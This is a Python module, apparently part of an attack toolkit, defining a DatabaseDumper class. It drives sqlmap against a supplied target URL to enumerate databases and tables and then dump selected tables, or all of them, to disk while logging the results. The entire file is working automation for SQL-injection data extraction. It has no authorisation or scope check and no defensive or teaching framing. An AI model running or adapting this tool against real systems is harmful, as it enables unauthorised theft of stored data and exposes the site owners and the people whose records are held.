import subprocess
import time
import os
from colorama import Fore, Style

class DatabaseDumper:
    def __init__(self, sqlmap_path):
        self.sqlmap_path = sqlmap_path
    
    def dump(self, target):
        print(f"{Fore.CYAN}[*] Database dumping: {target}{Style.RESET_ALL}")
        
        if not os.path.exists(self.sqlmap_path):
            print(f"{Fore.RED}[!] SQLMap not found{Style.RESET_ALL}")
            return
        
        # First, get database list
        print(f"{Fore.YELLOW}[+] Getting database list...{Style.RESET_ALL}")
        cmd_db = [
            "python3", self.sqlmap_path,
            "-u", target,
            "--dbs",
            "--batch"
        ]
        
        subprocess.run(cmd_db)
        
        db_name = input(f"\n{Fore.GREEN}[?] Database name to dump: {Style.RESET_ALL}")
        if not db_name:
            print(f"{Fore.RED}[!] No database specified{Style.RESET_ALL}")
            return
        
        # Get tables
        print(f"{Fore.YELLOW}[+] Getting tables from {db_name}...{Style.RESET_ALL}")
        cmd_tables = [
            "python3", self.sqlmap_path,
            "-u", target,
            "-D", db_name,
            "--tables",
            "--batch"
        ]
        
        subprocess.run(cmd_tables)
        
        # Dump data
        tables = input(f"{Fore.GREEN}[?] Table names (comma separated) or ALL: {Style.RESET_ALL}")
        
        if tables.upper() == "ALL":
            cmd_dump = [
                "python3", self.sqlmap_path,
                "-u", target,
                "-D", db_name,
                "--dump-all",
                "--batch",
                "--output-dir=output"
            ]
        else:
            cmd_dump = [
                "python3", self.sqlmap_path,
                "-u", target,
                "-D", db_name,
                "-T", tables,
                "--dump",
                "--batch",
                "--output-dir=output"
            ]
        
        print(f"{Fore.YELLOW}[+] Dumping data...{Style.RESET_ALL}")
        
        try:
            result = subprocess.run(cmd_dump, capture_output=True, text=True, timeout=600)
            
            # Save dump info
            dump_file = f"logs/dumps/dump_{db_name}_{int(time.time())}.log"
            with open(dump_file, 'w') as f:
                f.write(f"Target: {target}\n")
                f.write(f"Database: {db_name}\n")
                f.write(f"Tables: {tables}\n")
                f.write(f"Time: {time.ctime()}\n")
                f.write("="*50 + "\n")
                f.write(result.stdout[:5000])  # First 5000 chars
            
            print(f"{Fore.GREEN}[✓] Dump completed{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Check 'output/' directory for dumped files{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Log: {dump_file}{Style.RESET_ALL}")
            
        except subprocess.TimeoutExpired:
            print(f"{Fore.RED}[!] Dump timeout (10 minutes){Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
